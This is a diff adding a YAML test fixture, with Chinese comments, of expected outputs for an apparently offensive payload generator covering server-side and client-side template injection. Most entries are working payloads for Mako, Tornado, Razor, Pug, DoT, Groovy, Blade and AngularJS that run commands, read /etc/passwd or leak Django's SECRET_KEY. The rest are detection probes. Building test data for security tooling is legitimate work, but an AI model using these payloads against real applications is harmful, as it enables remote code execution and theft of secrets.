@@ -1,0 +1,176 @@
+# SSTI 引擎补全黄金样本（§13.2）
+#
+# 补齐 §A.3 里真正成立的那些模板引擎。注意其中几条是**反向指纹**：
+# Handlebars / Mustache 不求值，`{{7*7}}` 原样输出才是它们的特征。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= Python =================
+
+  - name: Mako 算术探测
+    state:
+      vuln: ssti
+      template: ssti.python.mako.detect
+      outputs: [raw]
+    expect:
+      payload: "${7*7}"
+
+  - name: Mako 命令执行
+    state:
+      vuln: ssti
+      template: ssti.python.mako.rce
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "<%import os%>${os.popen('id').read()}"
+
+  - name: Tornado 算术探测
+    state:
+      vuln: ssti
+      template: ssti.python.tornado.detect
+      outputs: [raw]
+    expect:
+      payload: "{{7*7}}"
+
+  - name: Tornado 命令执行
+    state:
+      vuln: ssti
+      template: ssti.python.tornado.rce
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{% import os %}{{os.popen('id').read()}}"
+
+  - name: Django 上下文转储
+    state:
+      vuln: ssti
+      template: ssti.python.django.detect
+      outputs: [raw]
+    expect:
+      payload: "{% debug %}"
+
+  - name: Django 配置泄露
+    state:
+      vuln: ssti
+      template: ssti.python.django.settings
+      outputs: [raw]
+    expect:
+      payload: "{{settings.SECRET_KEY}}"
+
+  # ================= .NET =================
+
+  - name: Razor 表达式探测
+    state:
+      vuln: ssti
+      template: ssti.dotnet.razor.detect
+      outputs: [raw]
+    expect:
+      payload: "@(7*7)"
+
+  - name: Razor 启动进程
+    state:
+      vuln: ssti
+      template: ssti.dotnet.razor.rce
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "@{ System.Diagnostics.Process.Start(\"/bin/sh\", \"-c id\"); }"
+
+  - name: Razor 读文件
+    state:
+      vuln: ssti
+      template: ssti.dotnet.razor.file.read
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      payload: "@(System.IO.File.ReadAllText(\"/etc/passwd\"))"
+
+  # ================= Node =================
+
+  - name: Pug 插值命令执行
+    state:
+      vuln: ssti
+      template: ssti.node.pug.rce
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "#{global.process.mainModule.require('child_process').execSync('id')}"
+
+  - name: DoT 求值命令执行
+    state:
+      vuln: ssti
+      template: ssti.node.dot.rce
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{{=global.process.mainModule.require('child_process').execSync('id')}}"
+
+  - name: logic-less 引擎反向指纹
+    state:
+      vuln: ssti
+      template: ssti.node.logiceless.detect
+      outputs: [raw]
+    expect:
+      # Handlebars / Mustache 不求值，所以产出就是原样的 7*7。
+      # 若目标输出 49，说明用的是会求值的引擎，不是这两家。
+      payload: "{{7*7}}"
+
+  # ================= Ruby =================
+
+  - name: Liquid 过滤器探测
+    state:
+      vuln: ssti
+      template: ssti.ruby.liquid.detect
+      outputs: [raw]
+    expect:
+      # Liquid 的 {{ }} 不做算术，但 plus 过滤器能算，输出 14 即命中
+      payload: "{{7 | plus: 7}}"
+
+  # ================= Java =================
+
+  - name: Groovy 命令执行
+    state:
+      vuln: ssti
+      template: ssti.java.groovy.rce
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "${'id'.execute().text}"
+
+  # ================= PHP =================
+
+  - name: Blade @php 代码块
+    state:
+      vuln: ssti
+      template: ssti.php.blade.php_tag
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "@php system('id'); @endphp"
+
+  # ================= 客户端模板注入 =================
+
+  - name: AngularJS 表达式探测
+    state:
+      vuln: ssti
+      template: ssti.client.angularjs.detect
+      outputs: [raw]
+    expect:
+      payload: "{{7*7}}"
+
+  - name: AngularJS 沙箱逃逸
+    state:
+      vuln: ssti
+      template: ssti.client.angularjs.escape
+      outputs: [raw]
+    expect:
+      payload: "{{constructor.constructor('alert(1)')()}}"
+
+  - name: Vue 客户端模板探测
+    state:
+      vuln: ssti
+      template: ssti.client.vue2.detect
+      outputs: [raw]
+    expect:
+      payload: "{{7*7}}"
